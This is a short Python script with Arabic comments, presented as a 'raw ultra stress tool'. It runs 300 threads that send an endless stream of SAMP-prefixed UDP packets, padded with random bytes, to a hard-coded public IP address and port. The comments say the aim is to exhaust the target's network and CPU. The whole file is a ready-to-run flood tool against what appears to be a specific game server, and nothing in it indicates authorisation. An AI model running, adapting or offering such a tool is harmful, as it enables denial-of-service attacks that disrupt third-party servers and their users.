import socket
import struct
import time
import threading
import os

# ==========================================
# أداة الضغط الأسطورية الخام (Raw Ultra Stress Tool)
# ==========================================

TARGET_IP = "51.68.107.75"
TARGET_PORT = 16498

# عدد الخيوط المفتوحة لأقصى حد ممكن
THREADS_COUNT = 300

is_running = True

def beast_worker():
    global is_running
    # إنشاء سوكيت خام عالي السرعة
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
    except:
        return

    # تجهيز الحزمة الثقيلة مسبقاً لربح كل أجزاء الثانية في السرعة
    try:
        ip_bytes = socket.inet_aton(TARGET_IP)
        port_bytes = struct.pack('<H', int(TARGET_PORT))
        # حزمة ضخمة مليئة بالبيانات لتثقيل النيتورك والمعالج معاً
        payload = b'SAMP' + ip_bytes + port_bytes + b'i' + os.urandom(1024)
    except:
        payload = b'SAMP' + socket.inet_aton(TARGET_IP) + struct.pack('<H', TARGET_PORT) + b'i'

    # حلقة عمياء بدون أي قيود أو توقف لاستهلاك 100% من المعالج والشبكة
    while is_running:
        try:
            client.sendto(payload, (TARGET_IP, TARGET_PORT))
        except:
            pass

    try:
        client.close()
    except:
        pass

def run_beast_mode():
    global is_running
    
    print("=" * 60)
    print("   [🔥⚡] تشغيل وضع الوحش الأقصى (Raw Beast Mode)")
    print("=" * 60)
    print(f"[*] الهدف المستهدف : {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] الخيوط المتاحة  : {THREADS_COUNT} Threads خام")
    print("[*] اضغط Ctrl+C للإيقاف.")
    print("=" * 60)

    threads = []
    
    # إطلاق الوحوش (Threads)
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=beast_worker)
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        while is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] إيقاف الاختبار يدوياً.")
        is_running = False

    for t in threads:
        t.join(timeout=0.1)

    print("[✅] تم إيقاف الوحش بنجاح.")

if __name__ == "__main__":
    run_beast_mode()
